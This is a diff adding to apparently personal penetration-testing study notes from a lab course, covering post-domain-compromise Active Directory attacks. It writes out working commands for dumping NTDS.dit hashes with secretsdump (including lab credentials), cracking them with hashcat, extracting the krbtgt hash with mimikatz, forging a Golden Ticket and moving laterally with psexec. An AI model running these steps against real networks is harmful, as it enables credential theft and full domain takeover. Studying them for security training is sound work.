@@ -938,7 +938,7 @@ why we can retrieve this password:
 - we have the access to the hackme drive share
 - and we set up that you can connect -->  using different credentials
 
-#### Post-compromise Attack strategy
+#### Post-Compromise Attack strategy
 #AD_Strategy 
 in this phase we have an account
 =>
@@ -953,3 +953,137 @@ what do we do:
 	- where does your account have access?
 	- old vulnerabilities die hard
 
+###  Post-Domain Compromise Attack 
+#### Post-Domain Compromise Attack strategy
+#AD_Strategy
+here we own the domain
+what do we do:
+- <span style="color:#00b050">provide as much value to client as possible</span>
+	- if in a 5 days work you compromise the domain in the 1st one =>  repeat the whole process 
+	                                                         again to find new vuln
+	- dump the NTDS.dit and crack passwords
+	- enumerates share for sensitive information
+- <span style="color:#00b050">persistence is important</span>
+	- what happen if our Domain Admin access is lost?
+	- create a Domain Admin account can be useful      (you must delete it after finishing the job)
+	- creating a Golden Ticket can be useful too   (for persistent)
+
+#### Dumping the NTDS.dit
+NTDS.dit -->  <span style="color:#00b050">DB used to store AD data</span>
+			includes:
+			- user information
+			- group information
+			- security descriptors
+			- password hashes
+
+to dump this DB we can use -->  [[cheet#secretsdump|secretsdump]] (with a known domain admin)
+=>
+`secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.128 -just-dc-ntlm`
+`172.16.214.128 -->  Domain Controller IP
+in this way we can get all the hashes:
+![[Pasted image 20240304114746.png]]
+
+Remember that we need only the last part of each hashes -->  to decrypt them
+=>
+trick to speed up this process:
+
+##### Speed up hash decrypt with Excel
+- copy all the hashes inside excel
+  ![[Pasted image 20240304111838.png]]
+- go to Data > Text to Column > click on Delimited > Next > Click also on Other and set to "`:`" >
+- Next > Finish
+- in this way <span style="color:#00b050">we have divided each part</span> -->  the last one is what we want
+  ![[Pasted image 20240304112146.png]]
+=>
+- copy all the hash
+- paste them inside a txt file
+- use [[cheet#hashcat|hashcat]] to decrypt them
+  `hashcat -m 1000 hashNTDS.txt /home/simone/Desktop/TCM/rockyou.txt`
+  =>
+  <span style="color:#00b050">we have found 6/12 passwords</span> 
+  now type `--show` to print all of them:
+  `hashcat -m 1000 hashNTDS.txt /home/simone/Desktop/TCM/rockyou.txt`
+  ![[Pasted image 20240304113046.png]]
+now:
+- copy all these hashes in a -->  new tab in excel  (sheet2 below at the left)
+- separate again as before the hashes from the passwords
+- go back to the sheet1
+- click on the first free cell in column C after the first hash
+- type  `=vlookup(B1,Sheet2!A:B,2,false)`
+  =>
+  this is the result:![[Pasted image 20240304113517.png]]
+  (4 in an error)
+
+when we have all the passwords:
+- click on the entire C column > Copy it > right click > Paste as Values (img with the `123` inside)
+- now we can delete the `#N/A` -->  bc we have deleted the formula for the column
+- <span style="color:#00b050">this is the result:</span>![[Pasted image 20240304114012.png]]
+
+keep in mind that:
+the PC passwords (`HYDRA-DC$, SPIDERMAN$...`) -->  are useless to decrypt
+=>
+focus on the -->  accounts
+
+#### Golden Tickets Attack Overview
+read again [[Notes_ETH#Kerberoasting|Kerberoasting]]
+
+when we compromise the:
+KeRBeros Ticket Granting Ticket (KRBTGT) account =>   we own the domain
+=>
+<span style="color:#00b050">we can request</span> -->  any resource or system on the domain
+
+what we want:
+a Golden tickets -->  that is a <span style="color:#00b050">complete access to every machine</span> 
+
+we'll use [[Notes_ETH#Mimikatz|Mimikatz]] -->  to retrieve some information  (that we need)
+<span style="background:#fff88f">we need:</span>
+ - the KRBTGT NTLM hash
+ - the domain SID
+
+with these 2 data -->  <span style="color:#00b050">we generate our Golden tickets</span>
+
+<span style="background:#fff88f">after having generated the Golden tickets:</span>
+we can use the "pass the ticket attack" -->  to <span style="color:#00b050">utilize the ticket anywhere</span>
+
+with this ticket:
+<span style="color:#00b050">we can access every machine</span> <span style="color:#00b050">on the DOMAIN</span>
+
+##### Attack
+turn on THEPUNISHER and Domain Controller
+from the Domain Controller -->  install [[cheet#Install mimikatz on victim machine|mimikatz]]
+- `mimikatz.exe`
+- `privilege::debug`
+- `lsadump::lsa /inject /name:krbtgt`    -->  pull down only the kerberos tgt account
+  ![[Pasted image 20240304121920.png]]
+- open a notepad
+- copy the SID and the KRBTGT NTLM hash
+- `kerberos::golden /User:Administrator /domain:marvel.local /sid:<copytheSID> /krbtgt:<copytheKRBTGT> /id:500 /ptt`
+  `/User:...` -->  can be anything (even a fake account)
+  `/id:500` -->  is the admin account
+  `/ptt` -->  pass the ticket
+  =>
+  we are:
+  - generating -->  a golden ticket
+  - passing it to -->  pass the ticket
+                 to use this ticket inside our session (the command line)
+                 =>
+                 we are going to -->     - open a new terminal
+                                     - that has this ticket
+                                     - from which we can -->  <span style="color:#00b050">ACCESS ANY PC IN THE </span>
+                                                         _<span style="color:#00b050">DOMAIN</span> 
+    =>
+    ![[Pasted image 20240304122817.png]]
+
+- `misc::cmd`    to open new terminal with the ticket loaded
+  =>
+  from here -->  <span style="color:#00b050">we can access to any PC in the domain</span>
+  example:
+  access the THEPUNISHER C drive:
+  `dir \\THEPUNISHER\c$`
+  ![[Pasted image 20240304123147.png]]
+
+<span style="background:#fff88f">what can we do now:</span>
+- we can download here [[cheet#psexec.py|psexec]] 
+- <span style="color:#00b050">gain access to THEPUNISHER machine</span> 
+  example:
+  `psexec.exe \\THEPUNISHER cmd.exe`
